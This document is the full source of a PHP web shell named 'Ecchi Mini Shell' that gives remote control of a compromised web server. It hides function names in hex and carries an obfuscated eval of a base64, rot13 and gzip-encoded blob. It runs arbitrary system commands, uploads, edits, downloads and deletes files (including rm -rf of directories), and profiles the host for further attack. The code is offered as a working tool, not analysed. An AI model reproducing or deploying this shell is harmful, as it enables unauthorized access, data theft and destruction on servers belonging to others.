<?php

$query = [
    "676574637764",
    "69735f646972",
    "69735f7772697461626c65",
    "65786563",
    "66756e6374696f6e5f657869737473",
    "7368656c6c5f65786563",
    "73797374656d",
    "7061737374687275",
    "6368646972",
    "62696e32686578",
    "6865783262696e",
    "7363616e646972",
    "696e695f736574",
    "686561646572",
    "626173656e616d65",
    "66696c657065726d73",
    "6d6f76655f75706c6f616465645f66696c65",
    "69735f66696c65",
    "68746d6c7370656369616c6368617273",
    "66696c655f7075745f636f6e74656e7473",
    "66696c655f6765745f636f6e74656e7473",
    "69735f7265616461626c65",
    "7068705f756e616d65",
    "72656e616d65",
    "756e6c696e6b",
    "66696c6574797065",
    "7365745f74696d655f6c696d6974",
    "66696c6573697a65",
    "7265616466696c65"
];

dhex(13)("X-XSS-Protection: 0");
dhex(26)(0);
error_reporting(0);
ob_start();
dhex(12)('max_execution_time', 0);
dhex(12)('output_buffering', 0);

if (version_compare(PHP_VERSION, '7.0.0', '<')) {
    set_magic_quotes_runtime(0);

    if (get_magic_quotes_gpc()) {
        function ecchi($array)
        {
            return is_array($array) ? array_map('ecchi', $array) : stripslashes($array);
        }
        $_POST = ecchi($_POST);
    }
} else {
    dhex(12)('magic_quotes_runtime', 0);
}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));

function w($dir, $perm)
{
    if (!dhex(2)($dir)) {
        return "<p class='text-danger'>" . $perm . "</p>";
    } else {
        return "<p class='text-warning'>" . $perm . "</p>";
    }
}

function r($dir, $perm)
{
    if (!dhex(2)($dir)) {
        return "<p class='text-danger'>" . $perm . "</p>";
    } else {
        return "<p class='text-warning'>" . $perm . "</p>";
    }
}

function getexist($cmd = null)
{
    if (dhex(4)('exec')) {
        $disable = dhex(3)($cmd);
    } else if (dhex(4)('shell_exec')) {
        $disable = dhex(5)($cmd);
    } else if (dhex(4)('system')) {
        $disable = dhex(6)($cmd);
    } else if (dhex(4)('passthru')) {
        $disable = dhex(7)($cmd);
    } else {
        $disable = 'Disable';
    }

    return $disable;
}

function dhex($num)
{
    global $query;
    for ($i = 0; $i < count($query); $i++) {
        $dec[] = hex2bin($query[$i]);
    }

    return $dec[$num];
}


function seorank($url)
{
    $setopt = array(
        CURLOPT_URL => 'https://www.checkmoz.com/bulktool',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => "getStatus=1&siteID=1&sitelink=$url&da=1&pa=1&alexa=1"
    );
    $ch = curl_init();
    curl_setopt_array($ch, $setopt);
    return curl_exec($ch);
    curl_close($ch);
}

function perms($file)
{
    $perms = dhex(15)($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getact($dir, $file, $label)
{
?>
    <label for="<?= $label ?>" class="font-weight-bold">
        Filename : <span class="text-secondary"><?= dhex(14)($file) ?></span>
        [ <a class="text-white text-decoration-none" href="?e=view&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">view</a> ]
        [ <a class="text-white text-decoration-none" href="?e=edit&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">edit</a> ]
        [ <a class="text-white text-decoration-none" href="?e=rename&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">rename</a> ]
        [ <a class="text-white text-decoration-none" href="?e=download&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">download</a> ]
        [ <a class="text-white text-decoration-none" href="?e=delete&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">delete</a> ]
    </label>
<?php
}

if (isset($_GET['fol'])) {
    if (ctype_xdigit($_GET['fol'])) {
        $dir = dhex(18)(dhex(9)(dhex(10)($_GET['fol'])));
        dhex(8)($dir);
    } else {
        $dir = dhex(18)(dhex(9)($_GET['fol']));
        dhex(8)($dir);
    }
} else {
    $dir = dhex(9)(dhex(0)());
}

$dir        = dhex(9)(str_replace("\\", "/", dhex(10)($dir)));
$scdir      = explode("/", dhex(10)($dir));
$scan       = dhex(11)(dhex(10)($dir));
$disable    = @ini_get('disable_functions');
$disable    = (!empty($disable)) ? "<font class='text-danger'>$disable</font>" : '<font style="color: #43C6AC">NONE</font>';
$os         = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
$checkrdp   = ($os !== 'Windows' && getexist() !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
$rank       = seorank($_SERVER['SERVER_NAME']);
$getrank    = preg_match_all('/(.*?)<\/td>/', $rank, $get);
$check      = preg_replace('/<td>/', '', $get[1]);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="nofollow, noindex, noarchive">
    <meta name="googlebot" content="nofollow, noindex, noarchive">
    <meta name="googlebot-news" content="nosnippet">
    <meta name="author" content="./EcchiExploit">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.11.3/css/dataTables.bootstrap5.min.css">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
    <title>Ecchi Mini Shell</title>
</head>

<style>
    p>span {
        color: #43C6AC;
    }

    th:hover {
        color: #00ffff !important;
        cursor: default;
    }

    td a:hover,
    .folder:hover,
    a p:hover,
    label a:hover,
    td i,
    a h5:hover {
        color: #00ffff !important;
    }

    div.form-group button:hover {
        background-color: #00ffff;
        border: 1px solid #00ffff;
    }

    .page-item.active .page-link {
        background-color: transparent !important;
        border: 1px solid #00ffff;
    }

    .page-link {
        background-color: transparent !important;
    }

    .offcanvas-body,
    .offcanvas-header {
        background-color: #000;
        border: 1px solid #00ffff;
    }

    .offcanvas {
        margin-top: 10%;
        height: 62%;
        box-shadow: 0px 0px 10px 0px #00ffff;
        margin-left: 3%;
    }

    @media only screen and (max-width: 767.98px) {
        .offcanvas {
            width: 50%;
            margin-top: 25%;
            margin-left: 25%;
        }
    }
</style>

<body class="bg-dark text-white">
    <nav class="navbar navbar-expand-md bg-dark navbar-light mt-2">
        <div class="container">
            <div class="col-md">
                <a class="navbar-brand text-white" href="<?= $_SERVER['PHP_SELF'] ?>">
                    <h5>./EcchiExploit</h5>
                </a>
            </div>
            <div class="col-md-3">
                <button class="btn btn-secondary" type="button" data-bs-toggle="offcanvas" data-bs-target="#infoser" aria-controls="infoser">Information Server</button>
                <button class="btn btn-secondary" type="button" data-bs-toggle="modal" data-bs-target="#fileupload" id="fileuploaded">UPLOAD</button>
            </div>
        </div>

        <div class="modal fade" id="fileupload" tabindex="-1" aria-labelledby="filelabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content bg-dark">
                    <div class="modal-header">
                        <h5 class="modal-title" id="filelabel">File Uploaded</h5>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal" aria-label="Close">&#x2715;</button>
                    </div>
                    <div class="modal-body">
                        <form method="POST" enctype="multipart/form-data">
                            <div class="input-group">
                                <div id="checkupl" hidden><?= w(dhex(10)($dir) . "/$direc", perms(dhex(10)($dir) . "/$direc")) ?></div>
                                <input type="file" class="form-control" name="file" onchange="this.form.submit()">
                            </div>
                            <!-- <button class="btn btn-secondary form-control mt-2" type="submit">Submit</button> -->
                        </form>
                        <?php
                        if (isset($_FILES['file'])) {
                            if (dhex(16)($_FILES['file']['tmp_name'], dhex(10)($dir) . "/" . $_FILES['file']['name'])) {
                                $title = "File Upload Success";
                                echo "<div id='alert' hidden>success</div>";
                                echo "<script>window.location = '?fol=" . $dir . "'</script>";
                            } else {
                                $title = "File Upload Failed";
                                echo "<div id='alert' hidden>permission denied</div>";
                            }
                        }
                        ?>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="infoser" aria-labelledby="infoserlab">
            <div class="offcanvas-header">
                <h5 class="offcanvas-title" id="infoserlab">Server Info</h5>
                <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body small">
                <p>
                    Rank Alexa : <span><?= $check[4] ?></span> |
                    DA : <span><?= $check[2] ?></span> |
                    PA : <span><?= $check[3] ?></span>
                </p>
                <p>OS : <span><?= $os ?></span></p>
                <p>RDP : <span><?= $checkrdp ?></span></p>
                <p>PHP Version : <span><?= PHP_VERSION ?></span></p>
                <p>Software : <span><?= $_SERVER['SERVER_SOFTWARE'] ?></span></p>
                <p>Information System : <span><?= dhex(22)() ?></span></p>
                <p>Disable Function : <span class="text-wrap"><?= $disable ?></span></p>
            </div>
        </div>
    </nav>
    <div class="container">
        <div class="row justify-content-center mt-2">
            <div class="col-md-12">
                <label for="dir">You In Here :</label>
                <?php
                foreach ($scdir as $c_dir => $cdir) {
                    echo "<a class='font-weight-bold text-decoration-none folder' id='dir' href='?fol=";
                    for ($i = 0; $i <= $c_dir; $i++) {
                        echo dhex(10)(dhex(9)($scdir[$i]));
                        if ($i != $c_dir) {
                            echo "/";
                        }
                    }
                    echo "'>" . $cdir . "</a>/";
                }
                if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['e'] == 'download')) {
                    $file = dhex(10)($_GET['file']);
                    @ob_end_clean();
                    dhex(13)('Content-Description: File Transfer');
                    dhex(13)('Content-Type: application/octet-stream');
                    dhex(13)('Content-Disposition: attachment; filename="' . dhex(14)($file) . '"');
                    dhex(13)('Expires: 0');
                    dhex(13)('Cache-Control: must-revalidate');
                    dhex(13)('Pragma: public');
                    dhex(13)('Content-Length: ' . dhex(27)($file));
                    dhex(28)($file);
                    exit;
                } else if ($_GET['e'] == 'delete_dir') {
                    if (dhex(1)(dhex(10)($dir))) {
                        if (dhex(2)(dhex(10)($dir))) {
                            @rmdir(dhex(10)($dir));
                            @dhex(3)("rm -rf " . dhex(10)($dir));
                            @dhex(3)("rmdir /s /q " . dhex(10)($dir));

                            $alert = "success";
                            $title = "Delete Success";

                            echo "<script>window.location='?fol=" . dhex(9)(dirname(dhex(10)($dir))) . "';</script>";
                            exit;
                        } else {
                            $alert = "permission denied";
                            $title = "could not remove " . dhex(14)(dhex(10)($dir));
                        }
                    }
                ?>
                    <div class="form-group">
                        <div id="alert" hidden><?= $alert ?></div>
                    </div>
                <?php
                } else if ($_GET['e'] == 'rename') {
                    $alert = 'Rename File';
                    if ($_POST['rename']) {
                        $rename = dhex(23)(dhex(10)($_GET['file']), dhex(10)($dir) . "/" . dhex(18)($_POST['rename']));
                        if ($rename) {
                            $alert = "success";
                            $title = "Success Rename File";
                            echo "<script>window.location='?dir=" . dhex(9)(dhex(10)($dir)) . "';</script>";
                        } else {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <?= getact($dir, dhex(10)($_GET['file']), 'rename') ?>
                            <input id="rename" type="text" name="rename" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= dhex(14)(dhex(10)($_GET['file'])) ?>">
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button class="btn btn-light form-control">Rename</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'rename_dir') {
                    $alert = 'Rename Directory';
                    if ($_POST['rename_dir']) {
                        $dir_rename = dhex(23)(dhex(10)($dir), "" . dirname(dhex(10)($dir)) . "/" . dhex(18)($_POST['rename_dir']) . "");
                        if ($dir_rename) {
                            $alert = "Success";
                            $title = "Rename Dir Success";
                            echo "<script>window.location='?fol=" . dhex(9)(dirname(dhex(10)($dir))) . "';</script>";
                        } else {
                            $alert = "permission denied";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <input name="rename_dir" type="text" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= dhex(14)(dhex(10)($dir)) ?>">
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Renamed!!</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'delete') {
                    $delete = dhex(24)(dhex(10)($_GET['file']));
                    if ($delete) {
                        $alert = "success";
                        $title = "Success Delete File" . dhex(10)($_GET['file']);
                        echo "<script>window.location ='?fol=" . dhex(9)(dhex(10)($dir)) . "';</script>";
                    } else {
                        $alert = "permission denied";
                        $title = "Denied Permission";
                    }
                ?>
                    <div class="form-group">
                        <div id="alert" hidden><?= $alert ?></div>
                    </div>
                <?php
                } else if ($_GET['e'] == 'edit') {
                    $alert = "Edit File";
                    if ($_POST['src']) {
                        $save = dhex(19)(dhex(10)($_GET['file']), $_POST['src']);
                        if ($save) {
                            $alert = "success";
                            $title = "Saved!";
                        } else {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <?= getact($dir, dhex(10)($_GET['file']), 'textarea') ?>
                            <textarea class="form-control bg-dark text-danger mb-2 mt-2" spellcheck="false" name="src" id="textarea" rows="10"><?= dhex(18)(@dhex(20)(dhex(10)($_GET['file']))) ?></textarea>
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Save</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'view') {
                    $alert = "View File";
                ?>
                    <div class="form-group">
                        <?= getact($dir, dhex(10)($_GET['file']), 'file') ?>
                        <textarea class="form-control bg-dark text-danger mb-2 mt-2" id="file" rows="5" readonly><?= dhex(18)(@dhex(20)(dhex(10)($_GET['file']))) ?></textarea>
                    </div>
                    <div id="alert" hidden><?= $alert ?></div>
                <?php
                } else if ($_GET['e'] == 'newfolder') {
                    $alert = 'Create New Folder';
                    if ($_POST['new_folder']) {
                        $newfolder = dhex(10)($dir) . '/' . dhex(18)($_POST['new_folder']);
                        if (!mkdir($newfolder)) {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        } else {
                            $alert = "success";
                            $title = "Success Create Folder";
                            echo "<script>window.location='?fol=" . dhex(9)(dhex(10)($dir)) . "';</script>";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <input type="text" name="new_folder" class="bg-dark text-danger form-control mb-2 mt-2" placeholder="name folder" required>
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Submit</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'newfile') {
                    $alert = "Create New File";
                    if ($_POST['new_file']) {
                        $newfile = dhex(18)($_POST['new_file']);
                        $fopen = fopen($newfile, "a+");
                        if ($fopen) {
                            $alert = 'success';
                            $title = "Success Create File";
                            echo '<script>window.location = "?e=edit&fol=' . dhex(9)(dhex(10)($dir)) . '&file=' . dhex(9)($_POST['new_file']) . '";</script>';
                        } else {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <input type="text" name="new_file" class="bg-dark text-danger form-control mb-2 mt-2" placeholder="name file" value="<?= dhex(10)($dir) . "/newfile.php" ?>" required>
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Submit</button>
                        </div>
                    </form>
                    <?php
                }
                if (dhex(1)(dhex(10)($dir)) == true) {
                    if (!dhex(21)(dhex(10)($dir))) {
                        echo "<p class='font-weight-bold text-danger'>can't open directory. ( not readable )</p>";
                    } else {
                    ?>
                        <div class="table-responsive mt-3">
                            <table class="table table-bordered table-striped table-hover" id="table">
                                <thead class="thead-white text-white text-center">
                                    <tr>
                                        <th>Name</th>
                                        <th>Filetype</th>
                                        <th>Perm</th>
                                        <th>Option</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    foreach ($scan as $direc) {
                                        $dtype = dhex(25)(dhex(10)($dir) . "/$direc");
                                        if ($direc === '..') {
                                            $href = "<a class='text-decoration-none' href='?fol=" . dhex(9)(dirname(dhex(10)($dir))) . "'>$direc</a>";
                                        } else if ($direc === '.') {
                                            $href = "<a class='text-decoration-none' href='?fol=" . dhex(9)(dhex(10)($dir)) . "'>$direc</a>";
                                        } else {
                                            $href = "<a class='text-decoration-none' href='?fol=" . dhex(9)(dhex(10)($dir) . "/" . $direc) . "'>$direc</a>";
                                        }
                                        if ($direc === '.' || $direc === '..') {
                                            $act_dir = "<a class='text-decoration-none' href='?e=newfile&fol=" . dhex(9)(dhex(10)($dir)) . "'>newfile</a> | <a class='text-decoration-none' href='?e=newfolder&fol=" . dhex(9)(dhex(10)($dir)) . "'>newfolder</a>";
                                        } else {
                                            $act_dir = "<a class='text-decoration-none' href='?e=rename_dir&fol=" . dhex(9)(dhex(10)($dir) . "/" . $direc) . "'>rename</a> | <a class='text-decoration-none' href='?e=delete_dir&fol=" . dhex(9)(dhex(10)($dir) . "/" . $direc) . "'>delete</a>";
                                        }
                                        if (!dhex(1)(dhex(10)($dir) . "/$direc")) continue;
                                    ?>
                                        <tr>
                                            <td class="border-light">
                                                <i class="fa-fw far fa-folder"></i>
                                                <?= $href ?>
                                            </td>
                                            <td class="border-light text-white text-center"><?= $dtype ?></td>
                                            <td class="border-light text-center">
                                                <?= w(dhex(10)($dir) . "/$direc", perms(dhex(10)($dir) . "/$direc")) ?>
                                            </td>
                                            <td class="border-light text-danger"><?= $act_dir ?></td>
                                        </tr>
                                <?php
                                    }
                                }
                            } else {
                                echo "<p class='font-weight-bold text-danger'>can't open directory.</p>";
                            }
                            foreach ($scan as $file) {
                                $infoext = pathinfo($file);
                                $ftype = dhex(25)(dhex(10)($dir) . "/$file");

                                if ($infoext['extension'] == 'php') {
                                    $i = '<i class="fa-fw fab fa-php"></i>';
                                    $ftype = 'php';
                                } else if ($infoext['extension'] == 'html' || $infoext['extension'] == 'htm') {
                                    $i = '<i class="fab fa-fw fa-html5"></i>';
                                    $ftype = 'html';
                                } else if ($infoext['extension'] == 'zip' || $infoext['extension'] == 'rar') {
                                    $i = '<i class="fas fa-fw fa-file-archive"></i>';
                                    $ftype = ($infoext['extension'] == 'zip') ? 'zip' : 'rar';
                                } else if ($infoext['extension'] == 'jpg' || $infoext['extension'] == 'jpeg' || $infoext['extension'] == 'png') {
                                    $i = '<i class="fas fa-fw fa-file-image"></i>';
                                    $ftype = 'image';
                                } else if ($infoext['extension'] == 'txt') {
                                    $i = '<i class="far fa-fw fa-file-code"></i>';
                                    $ftype = 'text file';
                                } else if ($infoext['extension'] == 'css') {
                                    $i = '<i class="fab fa-fw fa-css3-alt"></i>';
                                    $ftype = 'css';
                                } else if ($infoext['extension'] == 'js') {
                                    $i = '<i class="fab fa-fw fa-js-square"></i>';
                                    $ftype = 'js';
                                } else if ($infoext['extension'] == 'doc' || $infoext['extension'] == 'docx') {
                                    $i = '<i class="fab fa-fw fa-js-square"></i>';
                                    $ftype = ($infoext['extension'] == 'doc') ? 'doc' : 'docx';
                                } else if ($infoext['extension'] == 'pdf') {
                                    $i = '<i class="fas fa-file-pdf"></i>';
                                    $ftype = 'pdf';
                                } else if ($infoext['extension'] == 'py') {
                                    $i = '<i class="fab fa-fw fa-python"></i>';
                                    $ftype = 'python';
                                } else if ($infoext['extension'] == 'mp4' || $infoext['extension'] == 'mp3') {
                                    $i = ($infoext['extension'] == 'mp4') ? '<i class="fas fa-fw fa-file-video"></i>' : '<i class="fas fa-fw fa-file-audio"></i>';
                                    $ftype = ($infoext['extension'] == 'mp4') ? 'video' : 'audio';
                                } else if ($infoext['extension'] == 'htaccess' || $infoext['extension'] == 'ini') {
                                    $i = '<i class="fas fa-fw fa-cog"></i>';
                                    $ftype = ($infoext['extension'] == 'htaccess') ? 'htaccess' : 'configuration file';
                                } else {
                                    $i = '<i class="fas fa-fw fa-file"></i>';
                                }

                                if (!dhex(17)(dhex(10)($dir) . "/$file")) continue;
                                ?>
                                <tr>
                                    <td class="border-light">
                                        <?= $i ?>
                                        <a class="text-decoration-none" href="?e=view&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>"><?= $file ?></a>
                                    </td>
                                    <td class="text-center text-white"><?= $ftype ?></td>
                                    <td class="text-center">
                                        <?= w(dhex(10)($dir) . "/$file", perms(dhex(10)($dir) . "/$file")) ?>
                                    </td>
                                    <td class="text-danger border-light">
                                        <a class="text-decoration-none" href="?e=edit&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">edit</a> |
                                        <a class="text-decoration-none" href="?e=rename&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">rename</a> |
                                        <a class="text-decoration-none" href="?e=delete&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">delete</a> |
                                        <a class="text-decoration-none" href="?e=download&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">download</a>
                                    </td>
                                </tr>
                            <?php } ?>
                                </tbody>
                            </table>
                        </div>
            </div>
        </div>
    </div>

    <!-- <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script> -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.3/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.3/js/dataTables.bootstrap5.min.js"></script>

    <script>
        $(document).ready(function() {
            $('#table').DataTable({
                language: {
                    search: "_INPUT_",
                    searchPlaceholder: "Search..."
                },
                pageLength: 7,
                lengthMenu: [
                    [5, 7, 10, 20],
                    [5, 7, 10, 20]
                ]
            });


            if ($('#alert').text() !== '') {
                let alert = $('#alert').text();
                if (alert == 'success') {
                    Swal.fire({
                        icon: 'success',
                        title: '<?= $title ?>',
                    });
                } else if (alert == 'permission denied') {
                    Swal.fire({
                        icon: 'error',
                        title: '<?= $title ?>'
                    });
                } else {
                    Swal.fire({
                        icon: "info",
                        title: "<?= $alert ?>"
                    });
                }
            }
        });

        $("#fileuploaded").click(function() {
            if ($("#checkupl").find("p.text-danger")[0]) {
                $("input:file").attr('disabled', 'disabled');

                Swal.fire({
                    icon: "error",
                    title: "Permission Denied Upload File",
                    confirmButtonText: 'OK',
                })
            }
        });
    </script>
</body>

</html>
